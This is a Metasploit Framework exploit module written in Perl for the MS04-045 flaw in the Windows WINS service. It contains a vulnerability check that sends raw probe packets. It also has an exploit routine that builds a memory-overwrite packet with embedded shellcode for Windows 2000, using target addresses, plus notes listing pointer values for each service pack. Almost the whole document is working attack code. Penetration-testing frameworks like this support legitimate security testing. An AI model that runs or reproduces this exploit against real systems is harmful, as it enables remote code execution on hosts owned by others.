
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wins_ms04_045;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;
use Pex::Utils;
use Pex::Text;

my $advanced = 
{
	'BASE'	=> [0, 'Specify the exact address to the structure'],
	'TARG'	=> [0, 'Specify the exact address to overwrite'],
	'WHAT'	=> [0, 'Specify the data used to overwrite the address'],
};

my $info =
{
    'Name'  => 'Microsoft WINS MSO4-045 Code Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'process' },
    'UserOpts'  => {
                    'RHOST'  => [1, 'ADDR', 'The target address'],
                    'RPORT'  => [1, 'PORT', 'The target port', 42],
                },

    'Payload' => {
                     'Space' 	=> 4000,
					 'MinNops'	=> 256,
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
        This module exploits a arbitrary memory write flaw in the WINS service.
    }),
                
    'Refs'  =>   [  
                    ['MSB',     'MS04-045'],
                 ],
    'Targets'   =>
                 [
                   ['Windows 2000 English', 0x05391e80, 0x53df4c4, 0x05391ee0],
                 ],
    'Keys'  =>  ['wins'],                 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');	
	
	my $req = 
		"\x00\x00\x00\x29\x00\x00\x78\x00\x00\x00\x00\x00".
		"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x02\x00\x05".
		"\x00\x00\x00\x00\x60\x56\x02\x01\x00\x1F\x6E\x03".
		"\x00\x1F\x6E\x03\x08\xFE\x66\x03\x00";
		
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine("[*] Socket error: " . $s->GetError());
		return $self->CheckCode('Connect');
	}

	$s->Send($req);	
	my $res = $s->Recv(-1, 5);
	if (! $res) {
		$self->PrintLine("[*] No response to WINS probe.");
		$s->Close;
		return $self->CheckCode('Unknown');
	}
	
	$self->PrintDebugLine(1, sprintf("[*] Pointers: [0x%.8x] 0x%.8x 0x%.8x 0x%.8x", 
						  unpack('N', substr($res, 16, 4)),
						  unpack('VVV', substr($res, 32))));
	
	
	$req =	"\x00\x00\x00\x0F\x00\x00\x78\x00".
			substr($res, 16, 4).
			"\x00\x00\x00\x03\x00\x00\x00\x00";
			
    $s->Send($req);
    $res = $s->Recv(-1, 5);
    $s->Close;

    if (substr($res, 6, 1) eq "\x78") {
		$self->PrintLine("[*] This system appears to be vulnerable.");
		return $self->CheckCode('Appears');
    }

	$self->PrintLine("[*] This system does not appear to be vulnerable.");
	return $self->CheckCode('Safe');
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
   
    if (! $self->InitNops(128)) {
	    $self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $base = $target->[1];
	my $targ = $target->[2];
	my $code = $target->[3];
	
	$base = hex($self->GetVar('BASE')) if $self->GetVar('BASE');
	$targ = hex($self->GetVar('TARG')) if $self->GetVar('TARG');
	$code = hex($self->GetVar('WHAT')) if $self->GetVar('WHAT');
	
	
	# XXX - use multiple copies to account for differences between SP's
	my $req;
	$req .= pack('V', $targ - 0x48);
	$req .= Pex::Text::EnglishText(32);
	$req .= pack('V', $code) x 4;
	$req .= $shellcode;
	$req .= Pex::Text::EnglishText(1024);
	
	my $pkt = pack('NNN', length($req) - 8, -1, $base). $req;
	$self->PrintLine(sprintf("[*] Attempting to overwrite 0x%.8x with 0x%.8x (0x%.8x)", $targ, $code, $base));
	my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host,
        'PeerPort'  => $target_port,
    );

    if ($s->IsError) {
        $self->PrintLine("[*] Socket error: " . $s->GetError());
        return(0);
    }

	$s->Send($pkt);
	$self->Handler($s);
	$s->Close;
	return;
}

1;

__END__
SP0 [0x05371e90] 0x053dffa4 0x77fb80db 0x77f8ae78
SP1 [0x05371e90] 0x0580ffa4 0x77fb9045 0x77f81f70
SP2 [0x05371e90] 0x053dffa4 0x77fb9da7 0x77f82680
SP3 [0x05371e90] 0x053dffa4 0x77f82b95 0x77f83608
SP4 [0x05371e90] 0x053dffa4 0x77f98191 0x77f89640
SP4 [0x00000040] 0x053dffa4 0x77f98191 0x77f89640 (patched)

SP4 [0x0000003e] 0x053dffa4 0x77f81f55 0x77f82518 (mostly patched)
fe0 <<


NT4 ? 
YES [0x023b1e98] 0x0014c3f0 0x00000048 0x00000000
NOT [0x023d1dc8] 0x0014de60 0x00000048 0x0000023f
YES [0x023b1ea0] 0x00000048 0x00000009 0x0000023e


2003
YES	[0x00000040] 0x044bf584 0x01013c25 0x000003ac
